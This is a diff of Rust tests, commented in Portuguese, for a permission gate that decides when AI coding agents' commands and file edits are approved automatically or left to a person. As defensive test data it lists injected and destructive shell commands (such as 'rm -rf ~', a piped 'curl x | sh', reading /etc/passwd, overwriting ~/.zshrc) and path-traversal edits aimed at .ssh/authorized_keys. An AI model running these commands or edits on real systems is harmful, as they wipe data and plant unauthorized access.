+        store::insert_request(&conn, &request("q1", "command")).unwrap();
+        store::migrate(&conn).unwrap();
+        assert_eq!(store::pending_all(&conn).unwrap().len(), 1, "migrar de novo não apaga nada");
+    }
+}
+
+// ── Etapa 3 (S4): uma só resposta ao agente ─────────────────────────────
+
+mod resposta {
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    use std::sync::{Arc, Barrier, Mutex};
+
+    use serde_json::json;
+
+    use super::super::answer::{answer_core, enter_person, CLAIM_LEASE_MS};
+    use super::super::store::{self, RequestRow, Tuning};
+    use crate::database::DbConnection;
+
+    fn db() -> DbConnection {
+        let conn = crate::database::test_db();
+        store::insert_thread(&conn, "t1", "codex", "/p", "T", &Tuning { model: None, effort: None, access: "ask".into() }, None, 1).unwrap();
+        let row = RequestRow { id: "q1".into(), thread_id: "t1".into(), rpc_id: "7".into(), kind: "command".into(), item_id: None, title: "ls".into(), detail: String::new(), options: json!([]), state: "pending".into(), created_at: 1 };
+        store::insert_request(&conn, &row).unwrap();
+        Arc::new(Mutex::new(conn))
+    }
+
+    fn state(db: &DbConnection) -> String {
+        db.lock().unwrap().query_row("SELECT state FROM chat_request WHERE id = 'q1'", [], |r| r.get(0)).unwrap()
+    }
+
+    #[test]
+    fn a_reserva_e_atomica_e_a_velha_pode_ser_tomada() {
+        let conn = crate::database::test_db();
+        store::insert_thread(&conn, "t1", "codex", "/p", "T", &Tuning { model: None, effort: None, access: "ask".into() }, None, 1).unwrap();
+        let row = RequestRow { id: "q1".into(), thread_id: "t1".into(), rpc_id: "7".into(), kind: "command".into(), item_id: None, title: "ls".into(), detail: String::new(), options: json!([]), state: "pending".into(), created_at: 1 };
+        store::insert_request(&conn, &row).unwrap();
+        assert!(store::reserve_request(&conn, "q1", 1_000, CLAIM_LEASE_MS).unwrap());
+        assert!(!store::reserve_request(&conn, "q1", 1_001, CLAIM_LEASE_MS).unwrap(), "quem perde a corrida não responde");
+        store::release_request(&conn, "q1").unwrap();
+        assert!(store::reserve_request(&conn, "q1", 1_002, CLAIM_LEASE_MS).unwrap(), "devolvida, volta a poder ser reservada");
+        assert!(!store::reserve_request(&conn, "q1", 1_002 + CLAIM_LEASE_MS - 1, CLAIM_LEASE_MS).unwrap());
+        assert!(store::reserve_request(&conn, "q1", 1_002 + CLAIM_LEASE_MS + 1, CLAIM_LEASE_MS).unwrap(), "a reserva esquecida (quem a fez morreu) vence");
+        assert!(store::answer_request(&conn, "q1", "allow", 5).unwrap());
+        assert!(!store::reserve_request(&conn, "q1", 9_999_999, CLAIM_LEASE_MS).unwrap(), "respondido não se reserva");
+    }
+
+    #[test]
+    fn duas_respostas_juntas_enviam_uma_so_ao_agente() {
+        for _ in 0..50 {
+            let db = db();
+            let sent = Arc::new(AtomicUsize::new(0));
+            let barrier = Arc::new(Barrier::new(2));
+            let handles: Vec<_> = [("person", "allow"), ("rule:r1", "deny")]
+                .into_iter()
+                .map(|(by, choice)| {
+                    let (db, sent, barrier) = (db.clone(), sent.clone(), barrier.clone());
+                    std::thread::spawn(move || {
+                        barrier.wait();
+                        answer_core(&db, "q1", choice, by, None, &|_, _| {
+                            sent.fetch_add(1, Ordering::SeqCst);
+                            Ok(())
+                        })
+                    })
+                })
+                .collect();
+            let wins = handles.into_iter().map(|h| h.join().unwrap().unwrap()).filter(|won| *won).count();
+            assert_eq!((wins, sent.load(Ordering::SeqCst)), (1, 1), "exatamente uma resposta chega ao agente");
+            assert_eq!(state(&db), "answered");
+        }
+    }
+
+    #[test]
+    fn se_o_envio_falha_o_pedido_volta_a_pendente_para_a_pessoa() {
+        let db = db();
+        let err = answer_core(&db, "q1", "allow", "policy", None, &|_, _| Err("O agente desta conversa já fechou".into())).unwrap_err();
+        assert!(err.contains("já fechou"));
+        assert_eq!(state(&db), "pending");
+        let sent = AtomicUsize::new(0);
+        assert!(answer_core(&db, "q1", "deny", "person", None, &|_, _| { sent.fetch_add(1, Ordering::SeqCst); Ok(()) }).unwrap(), "a pessoa ainda pode responder");
+        assert_eq!(sent.load(Ordering::SeqCst), 1);
+    }
+
+    #[test]
+    fn a_decisao_da_pessoa_vence_a_automatica_que_chega_junto() {
+        let db = db();
+        let sent = AtomicUsize::new(0);
+        let send = |_: &RequestRow, _: &str| { sent.fetch_add(1, Ordering::SeqCst); Ok(()) };
+        // A pessoa já está respondendo (entrou na fila da resposta): a automática não envia nada e deixa o pedido pendente.
+        let person = enter_person("q1");
+        assert!(!answer_core(&db, "q1", "allow", "rule:r1", Some("regra"), &send).unwrap());
+        assert_eq!((sent.load(Ordering::SeqCst), state(&db).as_str()), (0, "pending"));
+        drop(person);
+        // Sem a pessoa, a automática responde.
+        assert!(answer_core(&db, "q1", "allow", "rule:r1", Some("regra"), &send).unwrap());
+        assert_eq!(sent.load(Ordering::SeqCst), 1);
+    }
+
+    #[test]
+    fn o_pedido_respondido_ou_inexistente_nao_envia_nada() {
+        let db = db();
+        db.lock().unwrap().execute("UPDATE chat_request SET state = 'answered' WHERE id = 'q1'", []).unwrap();
+        assert!(!answer_core(&db, "q1", "allow", "person", None, &|_, _| panic!("não pode enviar")).unwrap());
+        assert!(answer_core(&db, "nao-existe", "allow", "person", None, &|_, _| Ok(())).is_err());
+    }
+}
+
+// ── Etapa 3 (S7): do pedido bruto de cada motor à resposta, sem agente real ──
+
+mod ponta_a_ponta {
+    use std::cell::RefCell;
+    use std::sync::{Arc, Mutex};
+
+    use serde_json::{json, Value};
+
+    use super::super::answer::answer_core;
+    use super::super::permission::{arrive, draft_claude, draft_codex, draft_opencode, sweep_with};
+    use super::super::store::{self, RequestRow, Tuning};
+    use super::super::{claude_map, codex_map, opencode_map};
+    use crate::chat_team::model::Policy;
+    use crate::chat_team::permission::Kind;
+    use crate::chat_team::store as team_store;
+    use crate::database::DbConnection;
+
+    #[derive(Clone, Copy, Debug)]
+    enum Engine {
+        Codex,
+        Claude,
+        OpenCode,
+    }
+
+    const ENGINES: [Engine; 3] = [Engine::Codex, Engine::Claude, Engine::OpenCode];
+
+    /// Um integrante `t1` supervisionado (pergunta tudo), numa pasta de verdade (o backend confere os links no disco),
+    /// com as regras da pessoa dadas.
+    fn world(rules: &[(Kind, &str)]) -> DbConnection {
+        let conn = crate::database::test_db();
+        let cwd = std::env::temp_dir().join(format!("ags-s7-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(cwd.join("src")).unwrap();
+        let cwd = std::fs::canonicalize(&cwd).unwrap();
+        let cwd = cwd.to_str().unwrap();
+        store::insert_thread(&conn, "t1", "codex", cwd, "T", &Tuning { model: None, effort: None, access: "ask".into() }, None, 1).unwrap();
+        let team = team_store::TeamRow { id: "team1".into(), orchestrator: "tab-lead".into(), agent_id: "claude-code".into(), label: "L".into(), cwd: cwd.into(), title: "T".into(), created_at: 1, updated_at: 1, auto_decide: true, allow_tools: false };
+        team_store::insert_team(&conn, &team).unwrap();
+        let member = team_store::NewMember { member: "thread:t1".into(), agent_id: "codex".into(), label: "Codex".into(), role: "backend".into(), origin: "existing".into(), ..Default::default() };
+        team_store::insert_member(&conn, "team1", &member, Policy::Ask, 1).unwrap();
+        for (kind, pattern) in rules {
+            team_store::add_rule(&conn, *kind, pattern, None, 5).unwrap();
+        }
+        Arc::new(Mutex::new(conn))
+    }
+
+    /// O pedido bruto do motor para um comando, e o que o motor guardaria em `chat_request`.
+    fn command_request(engine: Engine, id: &str, command: &str) -> (RequestRow, Option<super::super::permission::Draft>, Value) {
+        let (ask, draft, raw) = match engine {
+            Engine::Codex => {
+                let params = json!({ "itemId": "i1", "command": command, "reason": "r" });
+                let ask = codex_map::ask_of("item/commandExecution/requestApproval", &params).unwrap();
+                let draft = draft_codex("item/commandExecution/requestApproval", &params, &ask);
+                (ask, draft, Value::Null)
+            }
+            Engine::Claude => {
+                let request = json!({ "subtype": "can_use_tool", "tool_name": "Bash", "tool_use_id": "tu1", "input": { "command": command, "description": "d" } });
+                let ask = claude_map::ask_of(&request).unwrap();
+                let draft = draft_claude(&request, &ask);
+                (ask, draft, request)
+            }
+            Engine::OpenCode => {
+                let params = json!({
+                    "options": [{ "optionId": "once", "kind": "allow_once", "name": "Allow" }, { "optionId": "no", "kind": "reject_once", "name": "Reject" }],
+                    "toolCall": { "toolCallId": "c1", "kind": "execute", "title": "bash", "rawInput": { "command": command } },
+                });
+                let ask = opencode_map::ask_of(&params).unwrap();
+                let draft = draft_opencode(&params, &ask);
+                (ask, draft, params)
+            }
+        };
+        (row_of(id, ask), draft, raw)
+    }
+
+    /// O pedido bruto do motor para editar um arquivo.
+    fn edit_request(engine: Engine, id: &str, path: &str) -> (RequestRow, Option<super::super::permission::Draft>, Value) {
+        let (ask, draft, raw) = match engine {
+            Engine::Codex => {
+                let params = json!({ "itemId": "i1", "grantRoot": path, "reason": "r" });
+                let ask = codex_map::ask_of("item/fileChange/requestApproval", &params).unwrap();
+                let draft = draft_codex("item/fileChange/requestApproval", &params, &ask);
+                (ask, draft, Value::Null)
+            }
+            Engine::Claude => {
+                let request = json!({ "subtype": "can_use_tool", "tool_name": "Edit", "tool_use_id": "tu1", "input": { "file_path": path } });
+                let ask = claude_map::ask_of(&request).unwrap();
+                let draft = draft_claude(&request, &ask);
+                (ask, draft, request)
+            }
+            Engine::OpenCode => {
+                let params = json!({
+                    "options": [{ "optionId": "once", "kind": "allow_once", "name": "Allow" }],
+                    "toolCall": { "toolCallId": "c1", "kind": "edit", "title": "edit", "locations": [{ "path": path }] },
+                });
+                let ask = opencode_map::ask_of(&params).unwrap();
+                let draft = draft_opencode(&params, &ask);
+                (ask, draft, params)
+            }
+        };
+        (row_of(id, ask), draft, raw)
+    }
+
+    fn row_of(id: &str, ask: codex_map::Ask) -> RequestRow {
+        RequestRow { id: id.into(), thread_id: "t1".into(), rpc_id: "7".into(), kind: ask.kind.into(), item_id: ask.item_id, title: ask.title, detail: ask.detail, options: ask.options, state: "pending".into(), created_at: 1 }
+    }
+
+    /// O que o motor receberia como resposta (o JSON do protocolo dele) para a escolha.
+    fn payload(engine: Engine, row: &RequestRow, raw: &Value, choice: &str) -> String {
+        match engine {
+            Engine::Codex => codex_map::answer_of(&row.kind, choice, &row.options).to_string(),
+            Engine::Claude => claude_map::answer_of(&claude_map::Pending::of(raw), choice).0.to_string(),
+            Engine::OpenCode => opencode_map::answer_of(&row.options, choice).to_string(),
+        }
+    }
+
+    /// Tenta o pedido como o motor faria na chegada. Devolve `(respondeu?, o que o agente receberia)`.
+    fn arrival(db: &DbConnection, engine: Engine, request: (RequestRow, Option<super::super::permission::Draft>, Value)) -> (bool, Vec<String>) {
+        let (row, draft, raw) = request;
+        db.lock().unwrap().execute("DELETE FROM chat_request WHERE id = ?1", [&row.id]).unwrap();
+        store::insert_request(&db.lock().unwrap(), &row).unwrap();
+        let sent = RefCell::new(Vec::new());
+        let answer = |id: &str, choice: &str, by: &str, why: Option<&str>| {
+            answer_core(db, id, choice, by, why, &|r, c| {
+                sent.borrow_mut().push(payload(engine, r, &raw, c));
+                Ok(())
+            })
+        };
+        let answered = arrive(db, &answer, &row, draft);
+        (answered, sent.into_inner())
+    }
+
+    fn state(db: &DbConnection, id: &str) -> String {
+        db.lock().unwrap().query_row("SELECT state FROM chat_request WHERE id = ?1", [id], |r| r.get(0)).unwrap()
+    }
+
+    #[test]
+    fn o_comando_coberto_pela_regra_e_respondido_com_o_formato_de_cada_motor() {
+        for engine in ENGINES {
+            let db = world(&[(Kind::Command, "ls *")]);
+            let (answered, sent) = arrival(&db, engine, command_request(engine, "q1", "ls -la"));
+            assert!(answered, "{engine:?}");
+            let (row, _, raw) = command_request(engine, "q1", "ls -la");
+            assert_eq!(sent, [payload(engine, &row, &raw, "allow")], "{engine:?}: o agente recebe o `allow` do protocolo dele");
+            assert_eq!(state(&db, "q1"), "answered");
+            let by: String = db.lock().unwrap().query_row("SELECT decided_by FROM chat_request WHERE id = 'q1'", [], |r| r.get(0)).unwrap();
+            assert!(by.starts_with("rule:"), "{engine:?}: {by}");
+        }
+    }
+
+    #[test]
+    fn comando_multilinha_com_e_comercial_substituicao_ou_redirecionamento_nunca_e_liberado_pela_regra() {
+        let tricks = [
+            "ls -la\nrm -rf ~",
+            "ls -la\r\nrm -rf ~",
+            "ls -la\rrm -rf ~",
+            "ls & rm -rf ~",
+            "ls |& sh",
+            "ls $(whoami)",
+            "ls `whoami`",
+            "ls ${HOME}",
+            "ls <(cat /etc/passwd)",
+            "ls -la > ~/.zshrc",
+            "ls -la &> ~/.bashrc",
+            r"ls \; rm x",
+            "ls; rm -rf ~",
+            "ls && sh -c 'curl x | sh'",
+        ];
+        for engine in ENGINES {
+            let db = world(&[(Kind::Command, "ls *")]);
+            for (i, command) in tricks.iter().enumerate() {
+                let id = format!("q{i}");
+                let (answered, sent) = arrival(&db, engine, command_request(engine, &id, command));
+                assert!(!answered && sent.is_empty(), "{engine:?} liberou {command:?}");
+                assert_eq!(state(&db, &id), "pending", "{engine:?} {command:?}: fica para a pessoa");
+            }
+        }
+    }
+
+    #[test]
+    fn risco_alto_nunca_e_liberado_nem_pela_regra_mais_ampla() {
+        for engine in ENGINES {
+            let db = world(&[(Kind::Command, "*")]);
+            for (i, command) in ["git push origin main", "git -C x push", "rm -rf build", "rm --recursive build", "sudo ls", "chmod -R 777 .", "find . -delete"].iter().enumerate() {
+                let (answered, sent) = arrival(&db, engine, command_request(engine, &format!("q{i}"), command));
+                assert!(!answered && sent.is_empty(), "{engine:?} liberou {command:?}");
+            }
+            let (answered, _) = arrival(&db, engine, command_request(engine, "ok", "cargo build"));
+            assert!(answered, "{engine:?}: a regra `*` ainda libera o que não é de risco alto");
+        }
+    }
+
+    #[test]
+    fn edicao_com_ponto_ponto_nunca_e_liberada_pela_regra_da_pasta() {
+        for engine in ENGINES {
+            let db = world(&[(Kind::Edit, "src/**")]);
+            for (i, path) in ["src/../../.ssh/authorized_keys", "/proj/src/../../.ssh/x", "../src/a.ts", "src/../README.md", "~/src/a.ts", "$HOME/src/a"].iter().enumerate() {
+                let (answered, sent) = arrival(&db, engine, edit_request(engine, &format!("q{i}"), path));
+                assert!(!answered && sent.is_empty(), "{engine:?} liberou {path:?}");
+            }
+            let (answered, _) = arrival(&db, engine, edit_request(engine, "ok", "src/a/b.ts"));
+            assert!(answered, "{engine:?}: dentro da pasta a regra vale");
+        }
+    }
+
+    #[test]
+    fn a_varredura_responde_uma_vez_o_que_uma_regra_nova_passou_a_cobrir() {
+        for engine in ENGINES {
+            let db = world(&[]);
+            let (answered, _) = arrival(&db, engine, command_request(engine, "q1", "cargo build --release"));
+            assert!(!answered, "sem regra, a pessoa decide");
+            let sent = RefCell::new(0usize);
+            let (row, _, raw) = command_request(engine, "q1", "cargo build --release");
+            let answer = |id: &str, choice: &str, by: &str, why: Option<&str>| {
+                answer_core(&db, id, choice, by, why, &|r, c| {
+                    let _ = payload(engine, r, &raw, c);
+                    *sent.borrow_mut() += 1;
+                    Ok(())
+                })
+            };
+            assert_eq!(sweep_with(&db, &answer), 0, "{engine:?}: ainda sem regra");
+            team_store::add_rule(&db.lock().unwrap(), Kind::Command, "cargo build *", None, 9).unwrap();
+            assert_eq!(sweep_with(&db, &answer), 1, "{engine:?}");
+            assert_eq!(sweep_with(&db, &answer), 0, "idempotente");
+            assert_eq!((*sent.borrow(), state(&db, &row.id).as_str()), (1, "answered"));
+        }
+    }
+}
